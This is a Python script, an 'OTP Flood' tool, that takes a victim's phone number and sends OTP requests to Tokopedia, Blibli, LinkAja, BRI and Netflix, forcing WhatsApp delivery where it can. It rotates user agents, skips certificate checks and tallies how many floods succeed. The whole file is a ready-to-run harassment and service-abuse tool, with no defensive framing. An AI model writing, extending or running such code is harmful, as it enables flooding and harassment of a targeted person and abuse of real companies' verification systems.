"""
OTP Flood - Trigger Module v7 (Force WhatsApp Channel)
"""

import requests
import urllib3
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
]

def _session(extra=None):
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
        "Content-Type": "application/json",
        "Cache-Control": "no-cache",
    })
    if extra: s.headers.update(extra)
    return s

class OTPTrigger:
    def __init__(self, target_number):
        self.target = self._format(target_number)
        self.sent_count = 0
        self.block_count = 0
        self.error_count = 0
        self._last_responses = {}

    def _format(self, n):
        n = n.strip().replace("+", "").replace(" ", "").replace("-", "")
        if n.startswith("0"): n = "62" + n[1:]
        return n

    def _local(self):
        return "0" + self.target[2:] if self.target.startswith("62") else self.target

    def _plus(self):
        return "+" + self.target

    # ============================================================
    # FORCING WHATSAPP CHANNELS
    # ============================================================

    def trigger_tokopedia_wa(self):
        """Tokopedia GQL forced to WhatsApp"""
        url = "https://gql.tokopedia.com/graphql"
        s = _session({
            "Origin": "https://www.tokopedia.com",
            "x-tkpd-user-id": "0",
            "x-source": "tokopedia-lite",
        })
        q = {
            "query": """
            mutation otpRequest($msisdn: String!) {
              OTPRequest(input: {phone: $msisdn, otpType: 2, channel: "whatsapp"}) {
                success
                message
              }
            }
            """,
            "operationName": "otpRequest",
            "variables": {"msisdn": self._local()}
        }
        try:
            r = s.post(url, json=q, timeout=10, verify=False)
            self._last_responses["tokopedia_wa"] = (r.status_code, r.text[:200])
            if r.status_code == 200 and "data" in r.text: return "sent"
            return "error"
        except Exception as e:
            self._last_responses["tokopedia_wa"] = (0, str(e))
            return "error"

    def trigger_blibli_wa(self):
        """Blibli GQL forced to WhatsApp"""
        url = "https://www.blibli.com/backend/graphql"
        s = _session({"Origin": "https://www.blibli.com"})
        q = {
            "query": """
            mutation sendOtp($phone: String!) {
              sendOtp(phoneNumber: $phone, channel: "WHATSAPP") {
                success
                errorCode
              }
            }
            """,
            "variables": {"phone": self._local()}
        }
        try:
            r = s.post(url, json={**q, "operationName": None}, timeout=10, verify=False)
            self._last_responses["blibli_wa"] = (r.status_code, r.text[:200])
            if r.status_code == 200: return "sent"
            return "error"
        except Exception as e:
            self._last_responses["blibli_wa"] = (0, str(e))
            return "error"

    def trigger_linkaja_wa(self):
        url = "https://api.linkaja.com/v1/otp/request"
        s = _session()
        d = {"phone": self._local(), "channel": "wa"}
        try:
            r = s.post(url, json=d, timeout=10, verify=False)
            self._last_responses["linkaja_wa"] = (r.status_code, r.text[:200])
            if r.status_code == 200: return "sent"
            return "error"
        except Exception as e:
            self._last_responses["linkaja_wa"] = (0, str(e))
            return "error"

    # Retain working APIs
    def trigger_bri(self):
        try:
            s = _session()
            r = s.post("https://api.bri.co.id/auth/otp", json={"phone": self._local()}, timeout=10, verify=False)
            self._last_responses["bri"] = (r.status_code, r.text[:200])
            return "sent" if r.status_code == 200 else "error"
        except: return "error"

    def trigger_netflix(self):
        try:
            s = _session({"Referer": "https://www.netflix.com/id/signup"})
            r = s.post("https://www.netflix.com/id/signup/phoneverification/sendOtp",
                       json={"phoneNumber": self._local(), "countryOfSignup": "ID"}, timeout=10, verify=False)
            self._last_responses["netflix"] = (r.status_code, r.text[:200])
            if r.status_code == 200: return "sent"
            return "error"
        except: return "error"

    BRANDS = {
        "tokopedia_wa": {"name": "Tokopedia WA", "cat": "e-commerce", "fn": trigger_tokopedia_wa},
        "blibli_wa":    {"name": "Blibli WA",    "cat": "e-commerce", "fn": trigger_blibli_wa},
        "linkaja_wa":   {"name": "LinkAja WA",   "cat": "finance",    "fn": trigger_linkaja_wa},
        "bri":          {"name": "BRI (SMS)",    "cat": "bank",       "fn": trigger_bri},
        "netflix":      {"name": "Netflix (SMS)","cat": "streaming",  "fn": trigger_netflix},
    }

    CATEGORIES = {"all": ["tokopedia_wa", "blibli_wa", "linkaja_wa", "bri", "netflix"]}

    def trigger(self, brand_key):
        b = self.BRANDS.get(brand_key)
        if not b: return "error"
        r = b["fn"](self)
        if r == "sent": self.sent_count += 1
        elif r == "blocked": self.block_count += 1
        else: self.error_count += 1
        return r

    def get_stats(self): return {"target": self.target, "sent": self.sent_count, "blocked": self.block_count, "error": self.error_count}

    def diag_all(self):
        results = {}
        for key, brand in self.BRANDS.items():
            try:
                res = self.trigger(key)
                code, snippet = self._last_responses.get(key, (0, ""))
                results[key] = {"name": brand["name"], "result": res, "code": code, "snippet": str(snippet)[:150]}
            except Exception as e:
                results[key] = {"name": brand["name"], "result": "error", "code": 0, "snippet": str(e)[:150]}
        return results

if __name__ == "__main__":
    import sys, io
    if sys.stdout.encoding.lower() != 'utf-8':
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    target = sys.argv[1] if len(sys.argv) > 1 else input("Nomor target: ")
    t = OTPTrigger(target)
    r = t.diag_all()
    for k, v in r.items():
        print(f"  [{'OK' if v['result']=='sent' else 'BL' if v['result']=='blocked' else 'ER'}] {v['name']:<14} HTTP {v['code']:<4} {v['result']:<8}")
